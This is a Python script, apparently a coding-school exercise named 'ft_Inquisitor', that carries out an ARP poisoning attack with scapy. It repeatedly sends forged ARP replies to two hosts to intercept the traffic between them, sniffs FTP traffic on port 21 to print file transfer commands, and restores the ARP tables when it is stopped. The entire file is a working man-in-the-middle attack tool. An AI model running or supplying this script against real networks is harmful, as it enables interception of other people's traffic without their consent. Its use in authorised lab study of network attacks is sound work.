#!/usr/bin/env python3

import sys
import argparse
import re
from scapy.all import ARP, Ether, sendp, sniff, conf

def is_valid_ip(ip_str):
	try:
		nums = ip_str.split('.')
		if len(nums) != 4:
			return False
		for n in nums:
			if int(n) < 0 or 255 < int(n):
				return False
		return True
	except:
		return False

def is_valid_mac(mac_str):
	mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
	return bool(mac_pattern.match(mac_str))

def parse_args():
    parser = argparse.ArgumentParser(description="ARP poisoning script")
    parser.add_argument("IP_src", help="Source IP address")
    parser.add_argument("MAC_src", help="Source MAC address")
    parser.add_argument("IP_target", help="Target IP address")
    parser.add_argument("MAC_target", help="Target MAC address")
    
    args = parser.parse_args()
    return args

def validate_args(args):
    try:
        if not is_valid_ip(args.IP_src):
            error_exit("Invalid IP-src")
        if not is_valid_mac(args.MAC_src):
            error_exit("Invalid MAC-src")
        if not is_valid_ip(args.IP_target):
            error_exit("Invalid IP-target")
        if not is_valid_mac(args.MAC_target):
            error_exit("Invalid MAC-target")
    except Exception as e:
        print("Error: IP or MAC are not valid!")
        sys.exit(1)

def sniff_ftp_packets(packet):
    if packet.haslayer('Raw') and (b'RETR ' in packet['Raw'].load or b'STOR ' in packet['Raw'].load):
        print(f"FTP File Transfer Detected: {packet['Raw'].load.decode()}")

def arp_poison(ip_src, mac_src, ip_target, mac_target):
    packet = Ether(dst=mac_target) / ARP(op=2, psrc=ip_src, hwsrc=mac_src, pdst=ip_target, hwdst=mac_target)
    sendp(packet, iface="eth0", verbose=False)

def restore_arp(ip_src, mac_src, ip_target, mac_target):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=ip_target, hwsrc=mac_target, pdst=ip_src, hwdst="ff:ff:ff:ff:ff:ff")
    sendp(packet, count=5, iface="eth0", verbose=False)

def main():
    args = parse_args()
    if len(sys.argv) != 5:
        print("Usage: ./ft_Inquisitor <IP-src> <MAC-src> <IP-target> <MAC-target>")
        return
    validate_args(args)

    try:
        print("Starting ARP poisoning...")
        while True:
            arp_poison(args.IP_src, args.MAC_src, args.IP_target, args.MAC_target)
            arp_poison(args.IP_target, args.MAC_target, args.IP_src, args.MAC_src)
            sniff(prn=sniff_ftp_packets, filter="tcp port 21", iface="eth0", timeout=1)
    except KeyboardInterrupt:
        print("Stopping ARP poisoning and restoring ARP tables...")
        restore_arp(args.IP_src, args.MAC_src, args.IP_target, args.MAC_target)
        restore_arp(args.IP_target, args.MAC_target, args.IP_src, args.MAC_src)
        print("ARP tables restored. Exiting.")

if __name__ == "__main__":
    main()